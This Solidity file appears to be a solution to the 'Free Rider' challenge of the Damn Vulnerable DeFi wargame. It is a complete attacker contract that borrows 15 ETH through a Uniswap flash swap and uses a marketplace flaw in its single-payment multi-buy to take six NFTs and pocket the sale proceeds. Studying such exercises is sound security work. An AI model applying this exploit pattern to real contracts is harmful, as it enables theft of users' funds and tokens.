// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract FreeRiderAttacker is IERC721Receiver {
    WETH private immutable weth;
    FreeRiderNFTMarketplace private immutable marketplace;
    DamnValuableNFT private immutable nft;
    address private immutable recoveryManager;
    address private immutable player;
    IUniswapV2Pair private immutable uniswapPair;
    uint256 private constant NFT_PRICE = 15 ether;
    
    constructor(
        address payable _weth,      
        address payable _marketplace, 
        address _nft,
        address _recoveryManager,
        address _player,
        address _uniswapPair
    ) {
        weth = WETH(_weth);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        recoveryManager = _recoveryManager;
        player = _player;
        uniswapPair = IUniswapV2Pair(_uniswapPair);
    }
    
    function attack() external {
        // Use Uniswap for flashLoan 15 ETH
        bytes memory data = abi.encode("flashLoan");
        uniswapPair.swap(
            NFT_PRICE,
            0,
            address(this),
            data
        );
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(uniswapPair), "Not uniswapPair");
        require(sender == address(this), "Not this contract");
        
        // Exchange WETH to ETH
        weth.withdraw(NFT_PRICE);
        
        // buy all the NFT with only once payment of 15 ETH
        uint256[] memory tokenIds = new uint256[](6);
        for(uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
        
        // Trasfer NFT to recoveryManager
        for(uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(player));
        }
        
        // Calculate the fee need to repay (extra 0.3%)
        uint256 fee = ((NFT_PRICE * 3) / 997) + 1;
        uint256 amountToRepay = NFT_PRICE + fee;
        
        // Exchange ETH to WETH
        weth.deposit{value: amountToRepay}();
        
        weth.transfer(address(uniswapPair), amountToRepay);
        
        // Trasfer ETH to player
        payable(player).transfer(address(this).balance);
    }
    
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }
    
    receive() external payable {}
}